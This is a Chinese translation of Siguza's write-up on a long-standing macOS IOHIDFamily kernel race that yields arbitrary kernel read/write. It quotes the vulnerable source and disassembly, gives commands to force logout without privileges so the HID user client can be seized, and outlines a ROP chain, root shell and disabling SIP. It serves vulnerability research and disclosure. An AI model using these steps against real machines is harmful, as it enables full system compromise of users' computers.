> 原文链接: https://www.anquanke.com//post/id/93301 


# 存在15年之久的macOS内核任意地址读写漏洞分析（含PoC）


                                阅读量   
                                **97557**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">1</a>
                                </b>
                                                                                    



##### 译文声明

本文是翻译文章，文章原作者Siguza，文章来源：siguza.github.io
                                <br>原文地址：[https://siguza.github.io/IOHIDeous/](https://siguza.github.io/IOHIDeous/)

译文仅供参考，具体内容表达以及含义原文为准

## 简介

这是一个IOHIDFamily的漏洞，可导致macOS内核任意地址读写。

与本writeup相关的exploit包括三个部分：
- poc (make poc). **所有macOS版本都受影响**。可导致内核崩溃，用于验证内存损坏；
- leak (make leak). ** macOS High Sierra（版本10.13）**受影响；
<li>hid (make hid).  **macOS 10.12以及 10.13~10.13.1之间**的版本受影响。可参考[README](https://github.com/Siguza/IOHIDeous/). 可进行完全的内核读写，可disable SIP（系统完整性保护）。<br>
本文用到的ioprint ioscan工具可以在这里下载：[https://github.com/Siguza/iokit-utils](https://github.com/Siguza/iokit-utils)
</li>
## 背景知识

为了理解攻击面以及这个漏洞，需要了解一些IOHIDFamily相关的内容。首先是[IOHIDSystem类](https://opensource.apple.com/source/IOHIDFamily/IOHIDFamily-1035.1.4/IOHIDSystem/IOHIDSystem.cpp.auto.html)，以及一些该类提供的UserClient， 比如IOHIDUserClient，IOHIDParamUserClient，IOHIDEventSystemUserClient。其中我们最感兴趣的是IOHIDUserClient。讲道理，它是这三个里面最强大的了。在正常的系统操作中，是由`WindowServer`进程持有的。

```
bash$ ioprint -d IOHIDUserClient
IOHIDUserClient(IOHIDUserClient): (os/kern) successful (0x0)
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"&gt;
&lt;plist version="1.0"&gt;
&lt;dict&gt;
    &lt;key&gt;IOUserClientCreator&lt;/key&gt;
    &lt;string&gt;pid 144, WindowServer&lt;/string&gt;
    &lt;key&gt;IOUserClientCrossEndianCompatible&lt;/key&gt;
    &lt;true/&gt;
&lt;/dict&gt;
&lt;/plist&gt;
```

这一点很重要。因为IOHIDSystem将任意时间可同时存在的IOHIDUserClient数限制为1个。在IOHIDUserClient打开的时候，将`evOpenCalled`变量设置为true，然后在IOHIDUserClient关闭的时候再把evOpenCalled设置为false，这个值是在`IOHIDSystem::evOpen`中检查的，然后又在`IOHIDSystem::newUserClientGated`中调用的。我们先看一下它是怎么使用UserClient的。

`1. EvOffsets`结构体：

```
typedef volatile struct _evOffsets `{`
  int evGlobalsOffset;    /* Offset to EvGlobals structure */
  int evShmemOffset;      /* Offset to private shmem regions */
`}` EvOffsets;
```

`2. EvGlobals`结构体；参考：[https://opensource.apple.com/source/IOHIDFamily/IOHIDFamily-1035.1.4/IOHIDSystem/IOKit/hidsystem/IOHIDShared.h.auto.html](https://opensource.apple.com/source/IOHIDFamily/IOHIDFamily-1035.1.4/IOHIDSystem/IOKit/hidsystem/IOHIDShared.h.auto.html)

3. Private driver memory.<br>
总之，所有的代码跟到最后都会到`IOHIDSystem::initShmem`这里。它是负责清理以及初始化实际的数据结构的。这才是真正有趣的地方。

## 漏洞

`IOHIDSystem::initShmem`的开头就是漏洞所在的地方。

```
int  i;
EvOffsets *eop;
int oldFlags = 0;

/* top of sharedMem is EvOffsets structure */
eop = (EvOffsets *) shmem_addr;

if (!clean) `{`
    oldFlags = ((EvGlobals *)((char *)shmem_addr + sizeof(EvOffsets)))-&gt;eventFlags;
`}`

bzero( (void*)shmem_addr, shmem_size);

/* fill in EvOffsets structure */
eop-&gt;evGlobalsOffset = sizeof(EvOffsets);
eop-&gt;evShmemOffset = eop-&gt;evGlobalsOffset + sizeof(EvGlobals);

/* find pointers to start of globals and private shmem region */
evg = (EvGlobals *)((char *)shmem_addr + eop-&gt;evGlobalsOffset);
evs = (void *)((char *)shmem_addr + eop-&gt;evShmemOffset);
```

能看出来吗？当共享内存映射到调用任务中的时候，会调用这个函数，<br>
而且EvOffsets是volatile的<br>
关键在于这行

```
eop-&gt;evGlobalsOffset = sizeof(EvOffsets);
```

和这行

```
evg = (EvGlobals *)((char *)shmem_addr + eop-&gt;evGlobalsOffset);
```

之间的`eop-&gt;evGlobalsOffset`值是可以改变的，这样可以使得`evg`指向与预期不同的地址。<br>
通过查看[源码](https://opensource.apple.com/source/IOHIDFamily/IOHIDFamily-33/IOHIDSystem/IOHIDSystem.cpp.auto.html)，可以发现这个漏洞早在2002年就已存在。

## Putting the exploit together

这部分挺有趣的。:P<br>
我们先看一下在`WindowServer`只持有一个`IOHIDUserClient`的情况下，如何得到一个`IOHIDUserClient`。<br>
首先想到的是，用`mach_port_extract_right`去”偷”一个`WindowServer`的client、但是问题是这得需要你本身是root身份，而且是在SIP（系统完整性保护）已经被禁用的情况下。<br>
然后想到的是直接`kill -9 WindowServer`, 还是需要root权限，但是不需要禁用掉SIP（系统完整性保护）。<br>
最后我发现在用户注销登录的时候，**`WindowServer`会释放掉`UserClient`持续几秒钟！**这时间足够了。<br>
于是我们可以用以下命令强制用户注销登录：

```
launchctl reboot logout
```

可以以低权限的身份运行吗？答案是：可以！<br>
loginwindow实现了”AppleEventReallyLogOut”，简写为”aevtrlgo”，可以它可以在不弹出确认对话框的情况下，使用户注销登录。而且loginwindow并没有验证事件(event)的来源，所以任意低权限用户身份(比如nobody)都可以这样绕过：

```
osascript -e 'tell application "loginwindow" to «event aevtrlgo»'
```

[此部分略。详情参考原文]<br>
为了提高成功率，需要以下操作：
1. 给`SIGTERM`和`SIGHUP`指定信号处理器。这样可以为我们在logout/shutdown/reboot发生之后赢得几秒钟的宝贵时间；
1. 执行`launchctl reboot logout`;
1. 若步骤2失败，则执行`osascript -e 'tell application "loginwindow" to «event aevtrlgo»'`;
<li>不断地生成所需的UserClient。这时无论我们有没有让用户注销登录了都没关系，只需要等待手动的logout/shutdown/reboot即可。只要IOServiceOpen 的返回值是kIOReturnBusy，我们就一直循环。<br>
以上逻辑在[src/hid/obtain.c](https://github.com/Siguza/IOHIDeous/tree/master/src/hid/obtain.c)中实现了，其中有部分在[src/hid/main.c](https://github.com/Siguza/IOHIDeous/tree/master/src/hid/main.c).</li>
## 触发漏洞

我们可以在恰当的时刻修改`eop-&gt;evGlobalsOffset`，还算幸运。但是成功的几率有多大呢?有以下三种结果：
<li>
**失败**。IOHIDFamily还是它应有的值；</li>
<li>
**成功**，evg成功指向我们在堆上的的数据结构；</li>
<li>
**成功**，但是evg并不能指向我们期望的地址。<br>
总结来说：<br>
在一个线程中，我们给`eop-&gt;evGlobalsOffset`指定一个值；<br>
在另一个线程中，我们进行初始化程序，直到满足`evg-&gt;version == 0`。<br>
以上逻辑在[src/hid/exploit.c](https://github.com/Siguza/IOHIDeous/tree/master/src/hid/exploit.c)中实现。mini版的实现在[src/poc/main.c](https://github.com/Siguza/IOHIDeous/blob/master/src/poc/main.c)。</li>
## Leaking the kernel slide, the tedious way

详情参考原文

## Leaking the kernel slide, the cheater’s way

详情参考原文

## Getting rip control

详情参考原文

## Turning rip into ROP

想要运行ROP，就需要知道内核shmem的地址。想要泄露shemem的地址，我们需要查看当我们的gadget调用时，寄存器上的值是多少。在free的时候发生。

```
array[i]-&gt;taggedRelease()
OSArray::flushCollection()
OSArray::free()
...
```

其中`taggedRelease()`的地方是一个我们提供的地址。而”我们”是在`flushCollection()`这个地方被调用的。长这个样子：

```
;-- OSArray::flushCollection:
0xffffff800081f0d0      55             push rbp
0xffffff800081f0d1      4889e5         mov rbp, rsp
0xffffff800081f0d4      4157           push r15
0xffffff800081f0d6      4156           push r14
0xffffff800081f0d8      53             push rbx
0xffffff800081f0d9      50             push rax
0xffffff800081f0da      4989ff         mov r15, rdi
0xffffff800081f0dd      41f6471001     test byte [r15 + 0x10], 1
0xffffff800081f0e2      7427           je 0xffffff800081f10b
0xffffff800081f0e4      f6052f0a2b00.  test byte [0xffffff8000acfb1a], 4
0xffffff800081f0eb      7510           jne 0xffffff800081f0fd
0xffffff800081f0ed      488d3dedaa1c.  lea rdi, str._Trying_to_change_a_collection_in_the_registry___BuildRoot_Library_Caches_com.apple.xbs_Sources_xnu_xnu_4570.1.46_libkern_c___OSCollection.cpp:67
0xffffff800081f0f4      31c0           xor eax, eax
0xffffff800081f0f6      e8a5d9a4ff     call sym._panic
0xffffff800081f0fb      eb0e           jmp 0xffffff800081f10b
0xffffff800081f0fd      488d3d6fab1c.  lea rdi, str.Trying_to_change_a_collection_in_the_registry
0xffffff800081f104      31c0           xor eax, eax
0xffffff800081f106      e8a5ceffff     call sym._OSReportWithBacktrace
0xffffff800081f10b      41ff470c       inc dword [r15 + 0xc]
0xffffff800081f10f      41837f2000     cmp dword [r15 + 0x20], 0
0xffffff800081f114      7425           je 0xffffff800081f13b
0xffffff800081f116      31db           xor ebx, ebx
0xffffff800081f118      4c8d3511f92a.  lea r14, sym.OSCollection::gMetaClass
0xffffff800081f11f      90             nop
0xffffff800081f120      498b4718       mov rax, qword [r15 + 0x18]
0xffffff800081f124      89d9           mov ecx, ebx
0xffffff800081f126      488b3cc8       mov rdi, qword [rax + rcx*8]
0xffffff800081f12a      488b07         mov rax, qword [rdi]
0xffffff800081f12d      4c89f6         mov rsi, r14
0xffffff800081f130      ff5050         call qword [rax + 0x50]
0xffffff800081f133      ffc3           inc ebx
0xffffff800081f135      413b5f20       cmp ebx, dword [r15 + 0x20]
0xffffff800081f139      72e5           jb 0xffffff800081f120
0xffffff800081f13b      41c747200000.  mov dword [r15 + 0x20], 0
0xffffff800081f143      4883c408       add rsp, 8
0xffffff800081f147      5b             pop rbx
0xffffff800081f148      415e           pop r14
0xffffff800081f14a      415f           pop r15
0xffffff800081f14c      5d             pop rbp
0xffffff800081f14d      c3             ret
```

其中：<br>`call qword [rax + 0x50]`是调用我们的gadget的地方;<br>`rdi`是我们伪造的object(也就是`_hibernateStats.graphicsReadyTime`的地址);<br>`rax`是我们伪造的vtable(也就是`_hibernateStats.lockScreenReadyTime`的地址减去 `0x50`);<br>`rsi`和`r14`是指向`OSCollection` meta class的指针;<br>`rbx`和`rcx`是我们object数组的index, 也就是0;<br>`r15`是我们”parent” `OSArray` object的指针;<br>
理论上来说，我们需要的就是`OSArray`指针数组的地址(因为其地址相对我们的共享内存的偏移量是恒定的)。可以发现，这个值只是暂时通过`mov rax, qword [r15 + 0x18]`给到rax, 但rax寄存器随后又赋上了object的vtable指针的值。

## 尽情的发挥吧

历经磨难的我们重要到了这一步啦！还等什么，让我们干点儿坏坏的事儿吧！<br>
拿到root权限，将内核态任务转移到用户态，安装一个root shell，然后禁用掉SIP（系统完整性保护）和AMFI。<br>
详情参考原文。

## 结论

One tiny, ugly bug. **Fifteen years.** Full system compromise.

## 参考

[https://github.com/Siguza/hsp4](https://github.com/Siguza/hsp4)<br>[https://googleprojectzero.blogspot.co.uk/2017/04/exception-oriented-exploitation-on-ios.html](https://googleprojectzero.blogspot.co.uk/2017/04/exception-oriented-exploitation-on-ios.html)<br>[https://github.com/kpwn/yalu102](https://github.com/kpwn/yalu102)<br>[http://newosxbook.com/files/PhJB.pdf](http://newosxbook.com/files/PhJB.pdf)<br>[https://github.com/Siguza/PhoenixNonce](https://github.com/Siguza/PhoenixNonce)<br>[https://gruss.cc/files/prefetch.pdf](https://gruss.cc/files/prefetch.pdf)<br>[https://github.com/benjamin-42/Trident](https://github.com/benjamin-42/Trident)
